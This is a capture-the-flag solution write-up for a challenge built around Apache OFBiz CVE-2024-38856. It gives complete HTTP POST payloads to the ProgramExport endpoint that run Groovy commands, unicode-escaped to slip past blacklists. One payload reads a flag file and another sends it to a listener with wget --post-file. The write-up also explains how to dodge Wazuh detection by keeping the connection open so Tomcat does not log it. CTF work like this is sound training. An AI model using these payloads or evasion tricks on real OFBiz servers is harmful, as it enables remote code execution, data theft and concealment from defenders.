# Solution of the challenge
The main bug here that can be easily exploited is CVE-2024-38856. There is ofbiz installed and run as user ofbiz. The flag is stored in the user directory of the ofbiz named "flag". The flag get's regenerated each time the container starts or the challenge was solved. 
This flag has to be posted via tcp stream to the flag-check service. The flag-check service is run under port 1881 and basically just a bash script that is started using xinet.d.

The exploit chain functions like this:
* OSINT to find open ports 8443 (ofbiz directly), 443 (leads to ofbiz webapp as proxy), 80 (leads to nothing)
* find ofbiz directories using dir enumeration
* use a valid host header to get around the security.properties host header allow list (https://github.com/apache/ofbiz-framework/blob/trunk/framework/security/config/security.properties)
* get version and find CVE-2024-38856 as valid entry point
* find flag, get detection logs
* do it again until the result is decend; sniff around the system.

## Evading detection
There are is wazuh, modsecurity and snoopy running. Wazuh also checks the apache logs for any call to ProgramExport, therefore every attemt to CVE-2024-38856 should be logged with a small time delay.
The check scripts waits for around 20 seconds and the counts the number of alerts and also sums the serverity of the alerts (**sum_of_alert_serverty**).

# Solution payloads
First ensure that requests to demo-trunk.ofbiz.apache.org reach our target, for example by adding a line to /etc/hosts.

Use CVE-2024-38856 for RCE. To work around the blacklists craft your command in unicode with hackvertor (burp) for example:
```
<@unicode_escapes>throw new Exception('cat /opt/ofbiz/flag'.execute().text);<@/unicode_escapes>
```

Target: https://demo-trunk.ofbiz.apache.org
```
POST /webtools/control/main/ProgramExport HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Host: demo-trunk.ofbiz.apache.org
Content-Length: 364

groovyProgram=
\u0074\u0068\u0072\u006F\u0077\u0020\u006E\u0065\u0077\u0020\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006F\u006E\u0028\u0027\u0063\u0061\u0074\u0020\u002F\u006F\u0070\u0074\u002F\u006F\u0066\u0062\u0069\u007A\u002F\u0066\u006C\u0061\u0067\u0027\u002E\u0065\u0078\u0065\u0063\u0075\u0074\u0065\u0028\u0029\u002E\u0074\u0065\u0078\u0074\u0029\u003B
````

If this payload is used, two alarms, one of the apache log and one of the tomcat log should be triggered. This is due to the listener on booth, the apache and the tomcat logs and the following ossec rule:
```
  <rule id="100002" level="12">
    <if_sid>31108</if_sid>
    <description>Possible execution of CVE-2023-51467: POST request to ProgramExport detected</description>
    <protocol>POST</protocol>
    <url>ProgramExport</url>
  </rule>
````

CVE-2023-51467 (see description) is a false flag, the same endpoint had some issues some time ago. This is only used to build a story why this simple detection rule should have been there already.

To work around this detection, one can simply send the payload directly to the apache-tomcat server which is exposed on 8443. This would only trigger one alert. Still one alert with a severity of 13.

### final solution

I've found an issue, where tomcat does not log any request. This is, when the connection is kept open. We can simulate this for example using the following payload:
```
<@unicode_escapes>throw new Exception('wget --post-file /opt/ofbiz/flag 172.17.0.1:55555 -q -T 999999'.execute().text);<@/unicode_escapes>
```

This comes down to (first start a listener somewhere):
https://demo-trunk.ofbiz.apache.org:8443
```
POST /webtools/control/main/ProgramExport HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Host: demo-trunk.ofbiz.apache.org
Content-Length: 622

groovyProgram=
\u0074\u0068\u0072\u006F\u0077\u0020\u006E\u0065\u0077\u0020\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006F\u006E\u0028\u0027\u0077\u0067\u0065\u0074\u0020\u002D\u002D\u0070\u006F\u0073\u0074\u002D\u0066\u0069\u006C\u0065\u0020\u002F\u006F\u0070\u0074\u002F\u006F\u0066\u0062\u0069\u007A\u002F\u0066\u006C\u0061\u0067\u0020\u0031\u0037\u0032\u002E\u0031\u0037\u002E\u0030\u002E\u0031\u003A\u0035\u0035\u0035\u0035\u0035\u0020\u002D\u0071\u0020\u002D\u0054\u0020\u0039\u0039\u0039\u0039\u0039\u0039\u0027\u002E\u0065\u0078\u0065\u0063\u0075\u0074\u0065\u0028\u0029\u002E\u0074\u0065\u0078\u0074\u0029\u003B
```

Posting this results in:
```
You had 1 alerts and a score of 3 (the lower the better ;)) ... Here is your final flag:
U2FsdGVkX1/TXnl3hRX0emEtDCq1v0wo0ilKFeY/xSE=
```


We need to start a local netcat listener on our machine before we can use this. (e.g. nc -nvlp 55555)
The flag we get, can now be used to get the results. It should not trigger any alert.
